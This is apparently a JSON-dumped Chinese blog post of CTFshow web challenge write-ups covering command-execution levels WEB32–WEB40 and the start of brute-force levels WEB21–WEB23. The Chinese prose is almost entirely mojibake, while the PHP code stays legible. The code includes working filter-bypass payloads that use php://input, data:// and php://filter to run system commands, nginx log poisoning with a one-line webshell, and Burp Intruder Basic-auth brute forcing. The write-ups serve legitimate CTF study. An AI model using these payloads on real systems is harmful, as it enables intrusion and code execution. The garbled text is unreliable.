¼å¼ä¿¡æ¯çš„å…³è”æ•°ç»„ã€‚è¿™é‡Œä¸»è¦æ˜¯è¿”å›æ•°ç»„ç¬¬ä¸€ä¸ª\u0026quot;.\u0026quot;\npos():è¾“å‡ºæ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¸æ”¹å˜æŒ‡é’ˆï¼›\nscandir();éå†ç›®å½•ï¼Œè¿™é‡Œå› ä¸ºå‚æ•°ä¸º\u0026quot;.\u0026ldquo;æ‰€ä»¥éå†å½“å‰ç›®å½•\narray_reverse():å…ƒç»„å€’ç½®\nnext():å°†æ•°ç»„æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªï¼Œè¿™é‡Œå…¶å®å¯ä»¥çœç•¥å€’ç½®å’Œæ”¹å˜æ•°ç»„æŒ‡é’ˆï¼Œç›´æ¥åˆ©ç”¨[2]å–å‡ºæ•°ç»„ä¹Ÿå¯ä»¥\nshow_source():æŸ¥çœ‹æºç \nWEB32 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } è¿‡æ»¤äº†å¤§éƒ¨åˆ†éœ€è¦ç”¨åˆ°çš„ä¸œè¥¿ï¼Œç›´æ¥ç»™cè¿›è¡Œä¼ å‚è¿›è¡Œå‘½ä»¤æ‰§è¡Œç°åœ¨åŸºæœ¬ä¸Šä¸å¯èƒ½äº†ï¼Œä¸è¿‡å¯ä»¥é€šè¿‡ç‰¹æ®Šæ–¹æ³•ç»•è¿‡\nä»¥ä¸‹æ˜¯ä¼ å‚\n1 ?c=include%0a$_GET[1]?%3E\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php è¿™æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿè¿™é‡Œçš„%0aå’Œ%3Eåˆ†åˆ«ä»£è¡¨å›è½¦å’Œ\u0026gt;ï¼Œå¯ä»¥ä»é¢˜ç›®ä¸­å‘ç°é¢˜ç›®ä¸­phpæºæ–‡ä»¶çš„å°–æ‹¬å·å¹¶ä¸æ˜¯é—­åˆçš„ï¼Œä»¥ä¸‹æ˜¯å‚è€ƒè§£æ\nåœ¨cå‚æ•°ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°ä»¥ä¸‹å†…å®¹ï¼š\nincludeï¼šè¿™æ˜¯ä¸€ä¸ªPHPå‡½æ•°ï¼Œç”¨æ¥åŒ…å«å¹¶æ‰§è¡ŒæŒ‡å®šæ–‡ä»¶çš„å†…å®¹ã€‚åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œå®ƒå¯ä»¥ç”¨æ¥åŠ è½½å¹¶æ‰§è¡ŒPHPæ–‡ä»¶ã€‚\n%0aï¼ˆæ¢è¡Œç¬¦ï¼‰ï¼šé€šè¿‡æ’å…¥æ¢è¡Œç¬¦ï¼Œå®ƒå¯èƒ½ä¼šå¸®åŠ©è·³è¿‡è¿‡æ»¤æ¡ä»¶ï¼Œæˆ–è€…å¯¹PHPè¯­æ³•äº§ç”Ÿæ„å¤–çš„å½±å“ã€‚\n$_GET[1]ï¼šè¿™æ˜¯é€šè¿‡GETè¯·æ±‚è·å–åä¸º1çš„å‚æ•°çš„å€¼ã€‚PHPçš„$_GETè¶…å…¨å±€æ•°ç»„å¯ä»¥ç”¨æ¥è·å–URLä¸­çš„æŸ¥è¯¢å‚æ•°ã€‚\n?%3Eï¼ˆ\u0026gt;ï¼‰ï¼šè¡¨ç¤ºHTMLæ ‡ç­¾çš„ç»“æŸç¬¦ã€‚è¿™ä¸ªç¬¦å·çš„ä½œç”¨å¯èƒ½æ˜¯ç»“æŸä¹‹å‰çš„PHPä»£ç å¹¶é˜²æ­¢å®ƒç»§ç»­æ‰§è¡Œã€‚\næ€»ç»“ä¸€ä¸‹ï¼Œè¿™éƒ¨åˆ†çš„å«ä¹‰æ˜¯ï¼šé€šè¿‡includeåŒ…å«ä¸€ä¸ªåŠ¨æ€è·¯å¾„æ–‡ä»¶ï¼Œå¹¶åœ¨è·¯å¾„ä¸­åˆ©ç”¨$_GET[1]æ¥è¿›ä¸€æ­¥æ§åˆ¶è¦æ‰§è¡Œçš„æ–‡ä»¶ã€‚\næ¥ä¸‹æ¥ä½¿ç”¨1=php://filter/convert.base64-encode/resource=flag.phpè¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œå°†è¯»å–å‡ºçš„base64ç¼–ç æ–‡ä»¶è½¬ä¸ºphpæ–‡ä»¶å³å¯ã€‚\nè¿˜æœ‰ä¸€ç§å†™æ³•\n1 url/?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php WEB33 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 02:22:27 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\\u0026#34;/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } è¿™é“é¢˜å’Œä¸Šä¸€é“é¢˜åŒºåˆ«ä¸å¤§ï¼ŒåŒæ ·å¯ä»¥ç”¨ä¸Šä¸€é“é¢˜çš„payloadè§£å‡ºã€‚\nä¸è¿‡çœ‹wpåå‘ç°è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼šæ—¥å¿—æ³¨å…¥\n1 url/?c=include$_GET[1]?%3E\u0026amp;1=../../../../var/log/nginx/access.log /var/log/nginx/access.logæ˜¯nginxé»˜è®¤çš„accessæ—¥å¿—è·¯å¾„ï¼Œè®¿é—®è¯¥è·¯å¾„æ—¶ï¼Œåœ¨User-Agentä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åç”¨ä¸­å›½èšå‰‘è¿æ¥å³å¯ã€‚\nWEB34 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 04:21:29 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } åŒä¸Šï¼Œè¿™é“é¢˜å¤šè¿‡æ»¤äº†å†’å·ï¼Œä½†æ˜¯ä»ç„¶å¯ä»¥ç›´æ¥ç”¨ä¸Šä¸Šä¸€é“é¢˜çš„payloadå³å¯è§£å‡ºã€‚\nç¿»wpå‘ç°è¿™å‡ é“é¢˜è¿˜æœ‰ä¸€ç§æ€è·¯ï¼š\né¢˜ç›®å¯¹å¸¸è§å‘½ä»¤éƒ½è¿›è¡Œè¿‡æ»¤, ä½†æ˜¯ä»”ç»†å‘ç°å¯ä»¥åˆ©ç”¨includeè¿›è¡Œç»•è¿‡, å…·ä½“å®ç°æ–¹å¼ä¸º eval(include flag.php;); ,ä½†æ˜¯é¢˜ç›®å±è”½äº†åˆ†å·(;)å’Œç‚¹å·(.), å…¶ä¸­åˆ†å·å¯ä»¥ä½¿ç”¨?\u0026gt;å¹³æ›¿,ä½†æ˜¯ç‚¹å·æ— æ³•ç»•è¿‡, é‚ä½¿ç”¨postæ‰§è¡Œphpä»£ç æ³¨å…¥flag.php, å› æ­¤å¯å¾—payload:\nGETï¼š?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://input\nPOSTä¼ å‚ï¼š\u0026lt;?php system('tac flag.php');?\u0026gt;\néœ€è¦æ³¨æ„,å› ä¸ºPOSTæ²¡æœ‰æŒ‰ç…§key=valueå°è£…æ•°æ®, å› æ­¤hackBarè®¤ä¸ºæ•°æ®æœ‰é—®é¢˜, ä¸ä¼šå‘é€æ•°æ®, å¯ä»¥ä½¿ç”¨Burp Suiteå‘é€æ•°æ®\nè¡¥å……: php://inputé»˜è®¤è¯»å–æ²¡æœ‰å¤„ç†è¿‡çš„POSTæ•°æ®\nWEB35 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 04:21:23 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;|\\\u0026lt;|\\=/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } è¿™æ¬¡å¤šè¿‡æ»¤äº†ç­‰äºå·å’Œ\u0026lt;å·ï¼Œä½†æ˜¯WEB32çš„payloadä»ç„¶å¯ç”¨ã€‚å› ä¸ºæ ¹æœ¬æ²¡ç”¨å·¦å°–æ‹¬å·å’Œç­‰å·\nWEB36 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 04:21:16 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;|\\\u0026lt;|\\=|\\/|[0-9]/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } è¿™æ¬¡å¤šè¿‡æ»¤äº†æ•°å­—ï¼Œè¯•è¯•WEB32é‚£ä¸ªpayloadï¼Œæ¬¸å¥½åƒä¸è¡Œäº†\u0026hellip;å—ï¼Ÿç›´æ¥æŠŠ1æ¢æˆå­—æ¯å°±å¯ä»¥äº†å•Šoi(#`Oâ€²)ï¼ï¼\nçœ‹ä¸€çœ¼wpå‘ç°ä¸€ç§æ–¹æ³•å’Œä¸Šé¢php://inputå¤§åŒå°å¼‚å°±ä¸è§£é‡Šäº†ã€‚\n?c=include$_GET[v]?\u0026gt;\u0026amp;v=data://text/plain,\u0026lt;?php system(\u0026quot;tac flag.php\u0026quot;)?\u0026gt;\nè¿™é¢˜è¿˜æ˜¯æ‚é±¼ï¼Œç›´æ¥ä¸‹ä¸€é¢˜\nWEB37 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 05:18:55 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ //flag in flag.php error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ include($c); echo $flag; } }else{ highlight_file(__FILE__); } å—¯ï¼Ÿè¿™é“é¢˜å¥½åƒä¸ä¸€æ ·äº†ï¼Œä¸€çœ‹è¿™ä¸ç›´æ¥å¸®å’±ä»¬includeå¥½äº†å˜›ï¼Œç›´æ¥ä¼ å‚\n?c=data://text/plain,\u0026lt;?php system(\u0026quot;tac fla*.php\u0026quot;)?\u0026gt;\nä¹Ÿå¯ä»¥ç”¨?c=data://inputç„¶åpostä¼ å‚\nè¿™é‡Œåœ¨wpé‡Œå‘ç°ä¸€ç§æœ‰æ„æ€çš„è§£æ³•?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=åº”è¯¥å¯ä»¥é€šè¿‡è¿™ç§æ–¹æ³•ç»•è¿‡ä¸å°‘è¿‡æ»¤ã€‚\nWEB38 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 05:23:36 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ //flag in flag.php error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|php|file/i\u0026#34;, $c)){ include($c); echo $flag; } }else{ highlight_file(__FILE__); } è¿™é“é¢˜WEB37ä¸­base64é‚£ä¸ªpayloadä»ç„¶å¯ä»¥ç»•è¿‡ï¼Œç”¨php://input+postä¼ å‚ä¹Ÿå¯ä»¥ï¼Œæˆ–è€…ç›´æ¥åœ¨WEB37åŸå§‹çš„payloadä¸Šç›´æ¥å°ä¿®æ”¹ä¸€ä¸‹?c=data://text/plain,\u0026lt;?=system(\u0026quot;tac f*\u0026quot;)?\u0026gt;ä¹Ÿå¯ä»¥ç›´æ¥ç»•è¿‡ã€‚\nWEB39 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 06:13:21 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ //flag in flag.php error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ include($c.\u0026#34;.php\u0026#34;); } }else{ highlight_file(__FILE__); } åŒWEB37ã€‚wpæœ‰ä½¬è§£é‡Šï¼šæ‹¼æ¥çš„phpå¯ä»¥ä¸ç”¨ç®¡ï¼Œincludeåªä¼šå¤„ç†å†…éƒ¨çš„å†…å®¹ï¼Œå¯¹flagçš„è¿‡æ»¤å¯ä»¥é‡‡ç”¨æ‹¼æ¥çš„æ–¹å¼ ?c=data://text/plainï¼Œè¿™é‡Œå·æ‡’äº†ï¼Œä¹Ÿå¯ä»¥base64ä¸€ä¸‹ã€‚\nWEB37ä¸­çš„å°–æ‹¬å·é—­åˆå¯ä»¥ç»•è¿‡.phpï¼Œå› ä¸ºç›¸å½“äºç›´æ¥ç»“æŸäº†phpæ–‡ä»¶ï¼ŒåŒç†ä¹Ÿå¯ä»¥ç”¨//æ³¨é‡Šæ‰åé¢çš„å†…å®¹ï¼Œæ¯”å¦‚?c=data://text/plain,\u0026lt;?php%20system(\u0026quot;tac%20fla*.php\u0026quot;);//æ¥è§£å†³è¿™é“é¢˜ã€‚\nWEB40 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 06:03:36 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\ï¼ˆ|\\ï¼‰|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\\u0026#39;|\\\u0026#34;|\\,|\\\u0026lt;|\\.|\\\u0026gt;|\\/|\\?|\\\\\\\\/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } å¥½å®¶ä¼™è¿™æ˜¯åŸºæœ¬ä¸ŠæŠŠèƒ½è¿‡æ»¤çš„ç¬¦å·å…¨éƒ¨ç»™å™¶äº†ï¼Œä¸è¿‡ä»”ç»†ä¸€çœ‹ä¼¼ä¹åŠè§’æ‹¬å·æ²¡è¢«è¿‡æ»¤ï¼Œé‚£åº”è¯¥å¦‚ä½•å°è¯•åªç”¨()å°±è·å–å‘¢ï¼Œä¸Šé¢é¢˜ç›®ï¼ˆWEB31ï¼‰å·²ç»æœ‰ä¾‹å­äº†ï¼Œç›´æ¥ç”¨?c=show_source(next(array_reverse(scandir(pos(localeconv())))));å°±ç›´æ¥ç»•è¿‡å•¦ã€‚\nè¿™é‡Œæœ‰ä¸¤ç§åšæ³•ï¼Œåˆ†åˆ«è§£æï¼š\n1.POSTä¼ å‚ c=eval(array_pop(next(get_defined_vars())));//éœ€è¦POSTä¼ å…¥å‚æ•°ä¸º1=system(\u0026rsquo;tac fl*\u0026rsquo;);\nget_defined_vars() è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡çš„å¤šç»´æ•°ç»„ã€‚è¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ï¼Œä¾‹å¦‚GETã€POSTã€FILEç­‰ç­‰ã€‚\nnext()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚\narray_pop() å‡½æ•°åˆ é™¤æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ å¹¶è¿”å›å…¶å€¼ã€‚\n2.show_source c=show_source(next(array_reverse(scandir(pos(localeconv()))))); æˆ–è€… c=show_source(next(array_reverse(scandir(getcwd()))));\ngetcwd() å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚å®ƒå¯ä»¥ä»£æ›¿pos(localeconv())\nlocaleconv()ï¼šè¿”å›åŒ…å«æœ¬åœ°åŒ–æ•°å­—å’Œè´§å¸æ ¼å¼ä¿¡æ¯çš„å…³è”æ•°ç»„ã€‚è¿™é‡Œä¸»è¦æ˜¯è¿”å›å€¼ä¸ºæ•°ç»„ä¸”ç¬¬ä¸€é¡¹ä¸º\u0026rdquo;.\u0026quot;\npos():è¾“å‡ºæ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¸æ”¹å˜æŒ‡é’ˆï¼›\ncurrent() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ï¼Œå’Œpos()ä¸€æ ·\nscandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚è¿™é‡Œå› ä¸ºå‚æ•°ä¸º\u0026quot;.\u0026ldquo;æ‰€ä»¥éå†å½“å‰ç›®å½•\narray_reverse():æ•°ç»„é€†ç½®\nnext():å°†æ•°ç»„æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªï¼Œè¿™é‡Œå…¶å®å¯ä»¥çœç•¥å€’ç½®å’Œæ”¹å˜æ•°ç»„æŒ‡é’ˆï¼Œç›´æ¥åˆ©ç”¨[2]å–å‡ºæ•°ç»„ä¹Ÿå¯ä»¥\nshow_source():æŸ¥çœ‹æºç \npos() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚è¯¥å‡½æ•°æ˜¯current()å‡½æ•°çš„åˆ«åã€‚\næ¯ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çš„æŒ‡é’ˆæŒ‡å‘å®ƒçš„\u0026quot;å½“å‰\u0026quot;å…ƒç´ ï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚\næç¤ºï¼šè¯¥å‡½æ•°ä¸ä¼šç§»åŠ¨æ•°ç»„å†…éƒ¨æŒ‡é’ˆã€‚\nç›¸å…³çš„æ–¹æ³•ï¼š\ncurrent()è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚\nend()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚\nnext()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚\nprev()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚\nreset()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚\neach()è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚\n","date":"2024-11-25T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_web_command_write_up_1/","title":"CTF_show Web å‘½ä»¤æ‰§è¡Œwriteup P1 WEB29-WEB40"},{"content":"CTFSHOW web çˆ†ç ´WriteUP WEB21 çˆ†ç ´ä»€ä¹ˆçš„ï¼Œéƒ½æ˜¯åŸºæ“\næ‰“å¼€ç¯å¢ƒåå‘ç°ç™»å½•ï¼Œç„¶åéšä¾¿è¾“å…¥å¯†ç ç”¨burpæŠ“åŒ…\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 GET / HTTP/1.1 Host: f57b8182-620f-42bb-96d2-07460dab13f7.challenge.ctf.show Cache-Control: max-age=0 Authorization: Basic YWRtaW46MTIzNDU= Sec-Ch-Ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;127\u0026#34;, \u0026#34;Not)A;Brand\u0026#34;;v=\u0026#34;99\u0026#34; Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \u0026#34;Windows\u0026#34; Accept-Language: zh-CN Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate, br Priority: u=0, i Connection: keep-alive å‘ç°Authorizationçš„å†…å®¹æ˜¯baseç¼–ç ï¼Œä½¿ç”¨base64è§£å‡ºadmin:12345ï¼Œæ­£æ˜¯åˆšåˆšè¾“å…¥çš„å†…å®¹ã€‚\nä½¿ç”¨Burpçš„IntruderåŠŸèƒ½çˆ†ç ´ï¼Œæ’å…¥åˆ°Authorizationåé¢\n1 Authorization: Basic Â§Â§ payloadç±»å‹è®¾ç½®ç®€å•åˆ—è¡¨ç„¶åå¯¼å…¥å­—å…¸ ç„¶åpayloadå¤„ç†ä¸­è®¾ç½®ä»¥ä¸‹å½¢å¼\n1 2 Add Prefix: admin: Base64-encode ä¸è¿‡è¯•äº†å‡ ä¸ªå­—å…¸éƒ½æ²¡çˆ†å‡ºæ¥æœ€åæ²¡åŠæ³•äº†ç›´æ¥çœ‹çš„ç­”æ¡ˆ\nè´¦å·å¯†ç åˆ†åˆ«ä¸ºadmin:shark63ï¼Œæäº¤è¯·æ±‚ç›´æ¥è·å–åˆ°flag\nWEB22 åŸŸåä¹Ÿå¯ä»¥çˆ†ç ´çš„ï¼Œè¯•è¯•çˆ†ç ´è¿™ä¸ªctf.showçš„å­åŸŸå\nè¿™é“é¢˜å› ä¸ºåŸæ¥åŸŸåå¤±æ•ˆå¯¼è‡´åšä¸äº†äº†ï¼Œç›´æ¥ç»™å‡ºäº†flag\nWEB23 è¿˜çˆ†ç ´ï¼Ÿè¿™ä¹ˆå¤šä»£ç ï¼Œå‘Šè¾ï¼\nä»æºç ä¸­å¯ä»¥çœ‹å‡ºè¯·æ±‚å‚æ•°ä¸º/?token=***\nå¯ä»¥çœ‹å‡ºtokenæ˜¯åŒ¹é…ç‰¹æ®Šçš„md5æ ¼å¼ï¼Œä½¿ç”¨chatgptè¯¢é—®å¹¶è®©å…¶ç¼–å†™ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 ä»£ç è§£æ include(\u0026#39;flag.php\u0026#39;);ï¼šå‡è®¾ flag.php æ–‡ä»¶ä¸­åŒ…å«ä¸€ä¸ªå˜é‡ $flagï¼Œå…¶å†…å®¹ä¸ºæˆ‘ä»¬æƒ³è¦è·å¾—çš„æ•æ„Ÿä¿¡æ¯ã€‚ if(isset($_GET[\u0026#39;token\u0026#39;])){ï¼šæ£€æŸ¥æ˜¯å¦é€šè¿‡ GET æ–¹æ³•ä¼ é€’äº† token å‚æ•°ã€‚ $token = md5($_GET[\u0026#39;token\u0026#39;]);ï¼šå¯¹ token å‚æ•°æ‰§è¡Œ md5 å“ˆå¸Œè®¡ç®—ï¼Œç»“æœä¿å­˜åœ¨ $token å˜é‡ä¸­ã€‚$token ç°åœ¨æ˜¯ä¸€ä¸ª32ä½çš„16è¿›åˆ¶å­—ç¬¦ä¸²ã€‚ æ¡ä»¶åˆ¤æ–­ï¼š if(substr($token, 1,1)===substr($token, 14,1) \u0026amp;\u0026amp; substr($token, 14,1) ===substr($token, 17,1))ï¼šæ£€æŸ¥ $token å­—ç¬¦ä¸²ä¸­ç¬¬2ä½ã€ç¬¬15ä½å’Œç¬¬18ä½æ˜¯å¦ç›¸åŒã€‚substr ç”¨äºæˆªå– $token ä¸­çš„å•ä¸ªå­—ç¬¦ï¼Œç´¢å¼•ä»0å¼€å§‹ï¼Œå› æ­¤ substr($token, 1,1) è¡¨ç¤ºè·å–ç¬¬äºŒä¸ªå­—ç¬¦ã€‚ if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))ï¼šè¿™æ¡è¯­å¥åœ¨ç»§ç»­æ£€æŸ¥ï¼Œå¦‚æœå‰é¢çš„æ¡ä»¶é€šè¿‡ï¼Œé‚£ä¹ˆå®ƒè¿›ä¸€æ­¥éªŒè¯ä¸€ä¸ªæ•°å­¦å…³ç³»ï¼š é¦–å…ˆï¼Œå®ƒå°†ç¬¬2ä½ã€ç¬¬15ä½å’Œç¬¬18ä½çš„å­—ç¬¦å€¼ç›¸åŠ å¹¶é™¤ä»¥ç¬¬2ä½çš„å­—ç¬¦å€¼ï¼Œç»“æœä¸ç¬¬32ä½å­—ç¬¦å€¼ç›¸ç­‰ã€‚ è¿™é‡Œä½¿ç”¨ intval å°†å­—ç¬¦è½¬æ¢ä¸ºæ•´æ•°å€¼ï¼Œä»¥ä¾¿æ‰§è¡Œæ•°å­¦è¿ç®—ã€‚ echo $flag;ï¼šå¦‚æœä¸Šè¿°æ‰€æœ‰æ¡ä»¶éƒ½æ»¡è¶³ï¼Œç¨‹åºè¾“å‡º $flagï¼Œå³æ•æ„Ÿä¿¡æ¯ã€‚ highlight_file(__FILE__);ï¼šå¦‚æœæ²¡æœ‰ä¼ é€’ token å‚æ•°ï¼Œæˆ– token ä¸æ»¡è¶³æ¡ä»¶ï¼Œé‚£ä¹ˆå°†æ˜¾ç¤ºå½“å‰æ–‡ä»¶çš„æºä»£ç ã€‚ 1 2 3 4 5 6 7 8 å¦‚ä½•æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ token ä¸ºäº†è·å¾— $flagï¼Œæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ª token å€¼ï¼Œä½¿å¾—å®ƒçš„ md5 